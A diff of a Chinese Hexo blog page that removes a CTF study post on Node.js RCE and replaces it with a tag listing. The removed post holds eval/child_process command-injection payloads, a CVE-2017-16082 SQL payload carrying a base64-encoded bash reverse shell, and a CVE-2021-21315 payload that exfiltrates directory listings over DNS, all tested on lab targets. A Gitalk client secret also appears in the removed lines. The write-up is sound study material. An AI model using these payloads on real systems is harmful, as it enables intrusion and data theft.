@@ -13,7 +13,7 @@
         hljs.initLineNumbersOnLoad();
     </script>
     
-    <title>Node.js RCE 漏洞总结 - 24k的小站</title>
+    <title>标签：原型链污染 - 24k的小站</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -21,35 +21,22 @@
     
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="命令执行 使用 child_process 子进程 执行系统指令 如果有使用 eval 函数则可以使用以下方式执行系统指令 ?eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cmd&#39;).toString()  以上指令详细解释：  require(&#39;child_process&#39;) 用于导入 Node.js 的 child_process 模块。  注：Node.js">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Node.js RCE 漏洞总结">
-<meta property="og:url" content="https://24kblog.top/posts/2767279470/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="24k的小站">
+<meta property="og:url" content="https://24kblog.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
 <meta property="og:site_name" content="24k的小站">
-<meta property="og:description" content="命令执行 使用 child_process 子进程 执行系统指令 如果有使用 eval 函数则可以使用以下方式执行系统指令 ?eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cmd&#39;).toString()  以上指令详细解释：  require(&#39;child_process&#39;) 用于导入 Node.js 的 child_process 模块。  注：Node.js">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=MEpGdExCZWlSemtNOXlQYzRCQUNFUFZjZCtGOHBheFE=">
-<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=M1JhdkJCT05HUFM0UllPNEJNSG0zL1ZjZCtGOHBheFE=">
-<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=cy9IVUJkbmplQ0ZBVTR5dFJsR2plUFZjZCtGOHBheFE=">
-<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=WVk5WEZ2L1p5ZzVSb25Gd2hCM3lwZlZjZCtGOHBheFE=">
-<meta property="article:published_time" content="2025-03-31T17:06:06.000Z">
-<meta property="article:modified_time" content="2025-03-31T17:10:36.985Z">
 <meta property="article:author" content="24kcsplus">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="笔记">
-<meta property="article:tag" content="Node.js">
-<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img.24kblog.top/app/hide.php?key=MEpGdExCZWlSemtNOXlQYzRCQUNFUFZjZCtGOHBheFE=">
     
 <link rel="stylesheet" href="/lib/fancybox/fancybox.css">
 <link rel="stylesheet" href="/lib/justifiedGallery/justifiedGallery.min.css">
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1744437293682">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1744437293780">
     
-    <link rel="stylesheet" href="/css/style.css?v=1744437293682">
+    <link rel="stylesheet" href="/css/style.css?v=1744437293780">
     
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="24k的小站" type="application/atom+xml">
 </head>
@@ -226,129 +213,40 @@
     </div>
     <div id="nexmoe-content">
         <div class="nexmoe-primary">
-            <div class="nexmoe-post">
+            <section class="nexmoe-posts">
+    
+    <div class="nexmoe-post">
+        <a href="/posts/1724511731/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img src="https://gcore.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg" alt="Python漏洞总结" loading="lazy">
+                    <h1>Python漏洞总结</h1>
+                </div>
+            
+        </a>
 
-  <article>
-      
-          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
-              <img data-fancybox="gallery" src="https://gcore.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg" alt="Node.js RCE 漏洞总结" loading="lazy">
-              <h1>Node.js RCE 漏洞总结</h1>
-          </div>
-      
-      
-      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2025年04月01日</a>
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2025年04月12日</a>
+            
+            
+                <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Python/" rel="tag">Python</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">原型链污染</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a>
+            
+        </div>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    
+        <a><i class="nexmoefont icon-areachart"></i>约2.2k字</a>
+        <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要10分钟</a>
+    
 </div>
 
-      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
-    
-        <a><i class="nexmoefont icon-areachart"></i>约503字</a>
-        <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要2分钟</a>
-    
-</div>
-
-      <h2 id="命令执行">命令执行</h2>
-<p>使用 <a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options">child_process 子进程</a> 执行系统指令</p>
-<p>如果有使用 eval 函数则可以使用以下方式执行系统指令</p>
-<pre><code>?eval=require('child_process').execSync('cmd').toString()
-</code></pre>
-<p>以上指令详细解释：</p>
-<ul>
-<li><code>require('child_process')</code> 用于导入 Node.js 的 child_process 模块。
-<ul>
-<li>注：Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令</li>
-</ul>
-</li>
-<li><code>execSync('cmd')</code> 同步执行其中的指令</li>
-<li><code>toString()</code> 将返回的对象转换为字符串类型</li>
-</ul>
-<p>若过滤了exec，还有 <code>spawnSync</code> 用法和详细解释如下</p>
-<pre><code>eval=require(&quot;child_process&quot;).spawnSync('cmd',['args']).stdout.toString()
-</code></pre>
-<ul>
-<li><code>require('child_process')</code> 同上</li>
-<li><code>spawnSync('cmd',['args'])</code> 同步执行 cmd 命令，数组内容是参数</li>
-<li><code>stdout</code> 访问子进程的标准输出，它是一个缓冲区（Buffer）对象。</li>
-<li><code>toString()</code> 方法将缓冲区转换为字符串，使输出内容可读。</li>
-</ul>
-<h3 id="例题">例题</h3>
-<ul>
-<li>CTFshow - web335</li>
-<li>CTFshow - web336</li>
-</ul>
-<h2 id="Node-js-CVE-的复现">Node.js CVE 的复现</h2>
-<h3 id="CVE-2017-16082">CVE-2017-16082</h3>
-<h4 id="原理">原理</h4>
-<p>详细请见<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html"> node.js + postgres 从注入到Getshell</a></p>
-<p>简述：获取数据库字段名并处理时将字段名作为参数传入 Function 类中，搭配 SQL 注入即可通过其创建的函数来远程执行代码</p>
-<h4 id="复现">复现</h4>
-<p>靶机地址：<br />
-<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md</a></p>
-<p>Payload：</p>
-<pre><code class="language-sql">SELECT 1 AS &quot;\']=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot;
-</code></pre>
-<p>靶机中无法直接控制字段名，但是因为可以多句执行，所以也可以控制传入的字段名</p>
-<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=MEpGdExCZWlSemtNOXlQYzRCQUNFUFZjZCtGOHBheFE=" alt="Pasted image 20250331231432" data-caption="Pasted image 20250331231432" loading="lazy"></p>
-<p>虽然此处返回内部错误，但此处其实已经成功反弹了 shell</p>
-<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=M1JhdkJCT05HUFM0UllPNEJNSG0zL1ZjZCtGOHBheFE=" alt="Pasted image 20250331231548" data-caption="Pasted image 20250331231548" loading="lazy"></p>
-<p>注意事项：在传参的过程中要进行 URL 编码后再发送请求，否则无法复现成功</p>
-<h3 id="CVE-2021-21315">CVE-2021-21315</h3>
-<p>靶机地址：使用 <a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus">vulfocus</a> 自建</p>
-<p>Payload</p>
-<pre><code>http://ip:port/api/getServices?name[]=$(&quot;cmd&quot;)
-</code></pre>
-<p>仅需发送 GET 请求即可</p>
-<p>在靶机中使用的 Payload 如下：</p>
-<pre><code>http://127.0.0.1:56430/api/getServices?name[]=$(ping%20`ls%20/tmp`.d247976159.ipv6.bypass.eu.org)
-</code></pre>
-<p>使用 Dnslog 服务，最终得到 flag</p>
-<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=cy9IVUJkbmplQ0ZBVTR5dFJsR2plUFZjZCtGOHBheFE=" alt="1743440284690" data-caption="1743440284690" loading="lazy"></p>
-<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=WVk5WEZ2L1p5ZzVSb25Gd2hCM3lwZlZjZCtGOHBheFE=" alt="Pasted image 20250401010532" data-caption="Pasted image 20250401010532" loading="lazy"></p>
-
-  </article>
-
-  
-      
-    <div class="nexmoe-post-copyright">
-        <strong>本文作者：</strong>24kcsplus<br>
-        <strong>本文链接：</strong><a href="https://24kblog.top/posts/2767279470/" title="https:&#x2F;&#x2F;24kblog.top&#x2F;posts&#x2F;2767279470&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;24kblog.top&#x2F;posts&#x2F;2767279470&#x2F;</a><br>
-        
-            <strong>版权声明：</strong>除非特别声明，否则本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
-        
+        <article>
+            
+        </article>
     </div>
-
-
-  
-  
-  <div class="nexmoe-post-meta nexmoe-rainbow">
     
-    
-        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Node-js/" rel="tag">Node.js</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/RCE/" rel="tag">RCE</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a>
-    
-</div>
-
-  
-      <div class="nexmoe-post-footer">
-          <section class="nexmoe-comment">
-    <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<div id="gitalk"></div>
-<script src="https://gcore.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
-<script type="text/javascript">
-    var gitalk = new Gitalk({
-        clientID: 'e33bbc7053e81da42425',
-        clientSecret: '947d44ea5a822012817f764e0a3d655a34995473',
-        id: md5(window.location.pathname),
-        repo: 'home_gitalk',
-        owner: '24kcsplus',
-        admin: '24kcsplus'
-    })
-    gitalk.render('gitalk')
-</script>
 </section>
-      </div>
-  
-</div>
+
             <div class="nexmoe-post-right">
               <div class="nexmoe-fixed">
                   <div class="nexmoe-tool"> 
@@ -356,13 +254,6 @@
                       
                         
                           
-                          
-                              <button class="mdui-fab catalog" style="overflow:unset;">
-                                  <i class="nexmoefont icon-i-catalog"></i>
-                                  <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js-CVE-%E7%9A%84%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">Node.js CVE 的复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-16082"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2017-16082</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-21315"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2021-21315</span></a></li></ol></li></ol>
-                                  </div>
-                              </button>
                           
                           
                       
@@ -395,10 +286,10 @@
 
  
 
-<script async src="/js/app.js?v=1744437293684"></script>
+<script async src="/js/app.js?v=1744437293781"></script>
 
 
-	<script async src="/js/search.js?v=1744437293685"></script>
+	<script async src="/js/search.js?v=1744437293781"></script>
 
 
 <script>
